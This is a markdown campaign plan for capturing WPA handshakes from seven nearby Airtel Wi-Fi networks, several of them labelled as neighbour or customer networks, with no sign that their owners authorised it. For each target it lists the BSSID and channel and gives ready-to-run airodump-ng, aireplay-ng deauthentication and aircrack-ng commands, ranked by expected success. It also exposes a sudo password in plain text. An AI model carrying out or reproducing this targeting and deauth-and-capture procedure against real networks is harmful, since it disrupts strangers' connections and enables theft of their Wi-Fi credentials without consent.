# ARES - Airtel Networks Testing Campaign
**Date**: January 16, 2026
**Target Group**: All Airtel Networks in Factory Range
**Strategy**: Best-Device Selection + Sequential Manual Testing

---

## 📋 Complete Airtel Networks List

### Total Networks: 7 Airtel Networks Detected

| # | Network Name | Best Device | Best Signal | Channel | BSSID | Priority |
|---|--------------|-------------|-------------|---------|-------|----------|
| 1 | **Airtel_Dharmani** | **Office** | **-14 dBm** ⭐⭐⭐⭐⭐ | 2 (2.4G) | 30:4f:75:57:7e:b8 | **HIGH** |
| 2 | **Airtel_Pardeep mittal** | **Office** | **-55 dBm** ⭐⭐⭐⭐ | 1 (2.4G) | 04:56:65:98:17:c9 | **HIGH** |
| 3 | **Airtel_suna_8627** | **Office** | **-61 dBm** ⭐⭐⭐ | 6 (2.4G) | f4:4d:5c:f5:83:ea | **MEDIUM** |
| 4 | **Airtel_vish_0615** | **Router** | **-45 dBm** ⭐⭐⭐⭐⭐ | 6 (2.4G) | fc:9f:2a:27:66:1f | **MEDIUM** |
| 5 | **Airtel_neer_3257** | **Office** | **-69 dBm** ⭐⭐⭐ | 11 (2.4G) | f8:0d:a9:b5:d2:aa | **LOW** |
| 6 | **Airtel_PAISLEY** | **Admin** | **-71 dBm** ⭐⭐⭐ | 6 (2.4G) | 24:43:e2:bb:56:e0 | **LOW** |
| 7 | **Airtel showroom** | **Admin** | **-73 dBm** ⭐⭐⭐ | 6 (2.4G) | b4:a7:c6:13:4e:09 | **LOW** |
| 8 | Airtel_Veluxe ground floor | Office | -85 dBm ⭐ | 153 (5G) | 20:0c:86:84:1a:ca | **SKIP** |

---

## 🎯 Strategic Testing Order (Best to Worst Signal)

### Phase 1: HIGH PRIORITY - Excellent Signals (90%+ Success)

#### Test 1: Airtel_Dharmani ⭐⭐⭐⭐⭐
```yaml
Network:     Airtel_Dharmani
BSSID:       30:4f:75:57:7e:b8 (2.4 GHz) / 30:4f:75:57:7e:b9 (5 GHz)
Channel:     2 (2.4 GHz) or 157 (5 GHz)
Frequency:   2.4 GHz + 5 GHz Dual Band

Best Device: Office Server (EXCLUSIVE)
Signal:      -14 dBm (2.4G) ⭐⭐⭐⭐⭐ EXCEPTIONAL
             -16 dBm (5G) ⭐⭐⭐⭐⭐ EXCEPTIONAL

Backup:      None (only visible from Office Server)

Expected:    99%+ capture success
Clients:     Likely present (ISP customer network)
Test Time:   2-3 minutes
```

**Commands:**
```bash
# SSH to Office Server
ssh office-server

# Setup monitor mode on Channel 2 (2.4 GHz)
echo 'Rama1994#' | sudo -S ip link set wlan0 down
echo 'Rama1994#' | sudo -S iw dev wlan0 set type monitor
echo 'Rama1994#' | sudo -S ip link set wlan0 up
echo 'Rama1994#' | sudo -S iw dev wlan0 set channel 2

# Client detection (10-15 seconds)
sudo airodump-ng --bssid 30:4f:75:57:7e:b8 -c 2 wlan0

# If clients present → Capture
sudo airodump-ng --bssid 30:4f:75:57:7e:b8 -c 2 -w /tmp/airtel_dharmani wlan0 &
CAPTURE_PID=$!
sleep 2

# Deauth (8 packets - research optimized)
sudo aireplay-ng --deauth 8 -a 30:4f:75:57:7e:b8 wlan0

# Wait 90 seconds for handshake
sleep 90

# Stop capture
sudo kill $CAPTURE_PID

# Check for handshake
sudo aircrack-ng /tmp/airtel_dharmani*.cap
```

---

#### Test 2: Airtel_Pardeep mittal ⭐⭐⭐⭐
```yaml
Network:     Airtel_Pardeep mittal
BSSID:       04:56:65:98:17:c9
Channel:     1 (2.4 GHz)
Frequency:   2417 MHz

Best Device: Office Server
Signal:      -55 dBm ⭐⭐⭐⭐ GOOD

Backup:      None (only visible from Office Server)

Expected:    90%+ capture success
Clients:     Likely present (neighbor network)
Test Time:   2-3 minutes
```

**Commands:**
```bash
# On Office Server (already in monitor mode)
sudo iw dev wlan0 set channel 1

# Client detection
sudo airodump-ng --bssid 04:56:65:98:17:c9 -c 1 wlan0

# Capture + Deauth
sudo airodump-ng --bssid 04:56:65:98:17:c9 -c 1 -w /tmp/airtel_pardeep wlan0 &
CAPTURE_PID=$!
sleep 2
sudo aireplay-ng --deauth 8 -a 04:56:65:98:17:c9 wlan0
sleep 90
sudo kill $CAPTURE_PID

# Check handshake
sudo aircrack-ng /tmp/airtel_pardeep*.cap
```

---

#### Test 3: Airtel_vish_0615 ⭐⭐⭐⭐⭐
```yaml
Network:     Airtel_vish_0615
BSSID:       fc:9f:2a:27:66:1f (2.4 GHz) / fc:9f:2a:27:66:20 (5 GHz)
Channel:     6 (2.4 GHz) or 36 (5 GHz)
Frequency:   2.4 GHz + 5 GHz Dual Band

Best Device: Router
Signal:      -45 dBm ⭐⭐⭐⭐⭐ EXCELLENT

Backup:      Lab Server (-66 dBm ⭐⭐⭐ FAIR)

Expected:    95%+ capture success IF clients present
Clients:     ⚠️ Previously detected 0 clients
             May need longer passive capture or wait for clients
Test Time:   3-5 minutes (or passive 30+ min if no clients)

Note:        Tested earlier - NO clients detected
             Try again or use passive capture
```

**Commands:**
```bash
# SSH to Router
ssh root@10.0.0.81

# Setup monitor mode
wifi down
iw phy phy0 interface add mon0 type monitor
ip link set mon0 up
iw dev mon0 set channel 6

# Client detection (15-20 seconds to be thorough)
airodump-ng --bssid fc:9f:2a:27:66:1f -c 6 mon0

# If NO clients → Decision:
# Option 1: Skip and come back later
# Option 2: Passive capture (30-60 minutes, wait for clients to connect)

# If clients present → Capture
airodump-ng --bssid fc:9f:2a:27:66:1f -c 6 -w /tmp/airtel_vish mon0 &
CAPTURE_PID=$!
sleep 2
aireplay-ng --deauth 8 -a fc:9f:2a:27:66:1f mon0
sleep 90
kill $CAPTURE_PID

# Check handshake
aircrack-ng /tmp/airtel_vish*.cap
```

---

### Phase 2: MEDIUM PRIORITY - Fair Signals (60-85% Success)

#### Test 4: Airtel_suna_8627 ⭐⭐⭐
```yaml
Network:     Airtel_suna_8627
BSSID:       f4:4d:5c:f5:83:ea
Channel:     6 (2.4 GHz)
Frequency:   2437 MHz

Best Device: Office Server
Signal:      -61 dBm ⭐⭐⭐ FAIR

Backup:      None

Expected:    85%+ capture success
Clients:     Unknown
Test Time:   3-4 minutes
```

**Commands:**
```bash
# On Office Server
sudo iw dev wlan0 set channel 6

# Client detection
sudo airodump-ng --bssid f4:4d:5c:f5:83:ea -c 6 wlan0

# Capture + Deauth
sudo airodump-ng --bssid f4:4d:5c:f5:83:ea -c 6 -w /tmp/airtel_suna wlan0 &
CAPTURE_PID=$!
sleep 2
sudo aireplay-ng --deauth 8 -a f4:4d:5c:f5:83:ea wlan0
sleep 90
sudo kill $CAPTURE_PID

# Check handshake
sudo aircrack-ng /tmp/airtel_suna*.cap
```

---

#### Test 5: Airtel_neer_3257 ⭐⭐⭐
```yaml
Network:     Airtel_neer_3257
BSSID:       f8:0d:a9:b5:d2:aa (2.4 GHz) / f8:0d:a9:b5:d2:ab (5 GHz)
Channel:     11 (2.4 GHz) or 157 (5 GHz)
Frequency:   2462 MHz (2.4G) / 5785 MHz (5G)

Best Device: Office Server
Signal:      -69 dBm ⭐⭐⭐ FAIR

Backup:      Admin Server (-78 dBm ⭐⭐ WEAK)
             Router (-82 dBm ⭐ WEAK)

Expected:    60%+ capture success
Clients:     Previously detected 10 data packets
Test Time:   3-4 minutes
```

**Commands:**
```bash
# On Office Server
sudo iw dev wlan0 set channel 11

# Client detection
sudo airodump-ng --bssid f8:0d:a9:b5:d2:aa -c 11 wlan0

# Capture + Deauth
sudo airodump-ng --bssid f8:0d:a9:b5:d2:aa -c 11 -w /tmp/airtel_neer wlan0 &
CAPTURE_PID=$!
sleep 2
sudo aireplay-ng --deauth 8 -a f8:0d:a9:b5:d2:aa wlan0
sleep 90
sudo kill $CAPTURE_PID

# Check handshake
sudo aircrack-ng /tmp/airtel_neer*.cap
```

---

### Phase 3: LOW PRIORITY - Weak Signals (30-60% Success)

#### Test 6: Airtel_PAISLEY ⭐⭐⭐
```yaml
Network:     Airtel_PAISLEY
BSSID:       24:43:e2:bb:56:e0 (2.4 GHz) / 24:43:e2:bb:56:e1 (5 GHz)
Channel:     6 (2.4 GHz) or 44 (5 GHz)
Frequency:   2437 MHz (2.4G) / 5220 MHz (5G)

Best Device: Admin Server
Signal:      -71 dBm ⭐⭐⭐ FAIR

Backup:      Router (-86 dBm ⭐ VERY WEAK)

Expected:    60%+ capture success
Clients:     Unknown
Test Time:   4-5 minutes
```

**Commands:**
```bash
# SSH to Admin Server
ssh admin-server

# Setup monitor mode
sudo nmcli device disconnect wlp3s0
sudo iw dev wlp3s0 set type monitor
sudo ip link set wlp3s0 up
sudo iw dev wlp3s0 set channel 6

# Client detection
sudo airodump-ng --bssid 24:43:e2:bb:56:e0 -c 6 wlp3s0

# Capture + Deauth
sudo airodump-ng --bssid 24:43:e2:bb:56:e0 -c 6 -w /tmp/airtel_paisley wlp3s0 &
CAPTURE_PID=$!
sleep 2
sudo aireplay-ng --deauth 8 -a 24:43:e2:bb:56:e0 wlp3s0
sleep 90
sudo kill $CAPTURE_PID

# Check handshake
sudo aircrack-ng /tmp/airtel_paisley*.cap
```

---

#### Test 7: Airtel showroom ⭐⭐⭐
```yaml
Network:     Airtel showroom
BSSID:       b4:a7:c6:13:4e:09
Channel:     6 (2.4 GHz)
Frequency:   2437 MHz

Best Device: Admin Server
Signal:      -73 dBm ⭐⭐⭐ FAIR

Backup:      Office Server (-72 dBm ⭐⭐⭐ FAIR)
             Router (-85 dBm ⭐ VERY WEAK)

Expected:    60%+ capture success
Clients:     Unknown
Test Time:   4-5 minutes
```

**Commands:**
```bash
# On Admin Server (already in monitor mode)
sudo iw dev wlp3s0 set channel 6

# Client detection
sudo airodump-ng --bssid b4:a7:c6:13:4e:09 -c 6 wlp3s0

# Capture + Deauth
sudo airodump-ng --bssid b4:a7:c6:13:4e:09 -c 6 -w /tmp/airtel_showroom wlp3s0 &
CAPTURE_PID=$!
sleep 2
sudo aireplay-ng --deauth 8 -a b4:a7:c6:13:4e:09 wlp3s0
sleep 90
sudo kill $CAPTURE_PID

# Check handshake
sudo aircrack-ng /tmp/airtel_showroom*.cap
```

---

### Phase 4: SKIP - Very Weak Signal (<30% Success)

#### ❌ Test 8: Airtel_Veluxe ground floor (NOT RECOMMENDED)
```yaml
Network:     Airtel_Veluxe ground floor
BSSID:       20:0c:86:84:1a:ca
Channel:     153 (5 GHz)
Frequency:   5765 MHz

Best Device: Office Server
Signal:      -85 dBm ⭐ VERY WEAK

Expected:    <30% capture success
Recommendation: SKIP - Signal too weak for reliable capture
```

---

## 📊 Summary Statistics

### By Priority:
- **HIGH Priority**: 3 networks (90-99% success)
- **MEDIUM Priority**: 2 networks (60-85% success)
- **LOW Priority**: 2 networks (30-60% success)
- **SKIP**: 1 network (<30% success)

### By Device:
- **Office Server**: 5 networks (MOST coverage)
- **Admin Server**: 2 networks
- **Router**: 1 network

### By Signal Quality:
- **EXCEPTIONAL** (-10 to -30 dBm): 1 network (Airtel_Dharmani)
- **EXCELLENT** (-30 to -50 dBm): 2 networks (Airtel_vish_0615, Airtel_Pardeep mittal)
- **GOOD** (-50 to -60 dBm): 1 network (Airtel_suna_8627)
- **FAIR** (-60 to -70 dBm): 3 networks (Airtel_neer_3257, Airtel_PAISLEY, Airtel showroom)
- **VERY WEAK** (>-80 dBm): 1 network (Airtel_Veluxe - SKIP)

---

## 🎯 Testing Strategy

### Approach:
1. **Start with HIGH priority** (best signals, highest success rate)
2. **Office Server first** (5 networks, best coverage)
3. **Client detection before capture** (CRITICAL - don't waste time on empty networks)
4. **8 deauth packets** (research-optimized, not 40-50)
5. **90 second capture window**
6. **Document results** after each test

### Expected Timeline:
- **Phase 1** (HIGH): 3 tests × 3 min = ~10 minutes
- **Phase 2** (MEDIUM): 2 tests × 4 min = ~8 minutes
- **Phase 3** (LOW): 2 tests × 5 min = ~10 minutes
- **Total**: ~30 minutes for all 7 networks

### Success Probability:
- **Phase 1**: 3/3 expected captures (90-99% each)
- **Phase 2**: 1-2/2 expected captures (60-85% each)
- **Phase 3**: 1/2 expected captures (30-60% each)
- **Overall**: 5-6 successful handshakes out of 7 networks

---

## 📝 Testing Checklist

Before each test:
- [ ] SSH to correct device
- [ ] Setup monitor mode
- [ ] Set correct channel
- [ ] **CHECK FOR CLIENTS** (10-15 sec airodump scan)
- [ ] If NO clients → Skip or passive capture
- [ ] If clients present → Proceed with capture

During capture:
- [ ] Start airodump-ng with correct BSSID and channel
- [ ] Wait 2 seconds
- [ ] Send 8 deauth packets
- [ ] Wait 90 seconds
- [ ] Stop capture

After capture:
- [ ] Check for handshake with aircrack-ng
- [ ] If handshake captured → Transfer to laptop
- [ ] Document: Network, Device, Signal, Clients, Result
- [ ] If failed → Note reason (no clients, weak signal, etc.)

---

## 📋 Results Tracking Template

```
Network: Airtel_Dharmani
Device: Office Server
Signal: -14 dBm
Channel: 2
Clients Detected: [YES/NO]
Client Count: [X]
Handshake Captured: [YES/NO]
Capture Time: [Xm Xs]
File: /tmp/airtel_dharmani-01.cap
Notes: [Any observations]

---
```

---

## 🚀 Ready to Start Testing!

**Recommendation**: Start with **Airtel_Dharmani** from Office Server
- Best signal (-14 dBm)
- Highest success probability (99%+)
- Office Server exclusive
- Quick 2-3 minute test

Commands ready above in Test 1 section.

---

**Testing Plan Status**: ✅ Complete
**Total Targets**: 7 Airtel networks
**Recommended Order**: HIGH → MEDIUM → LOW priority
**Expected Success**: 5-6 handshakes out of 7 networks
**Estimated Time**: ~30 minutes total

---

*"ARES Airtel Campaign: Strategic, Sequential, Signal-Optimized"* 📡🎯⚡
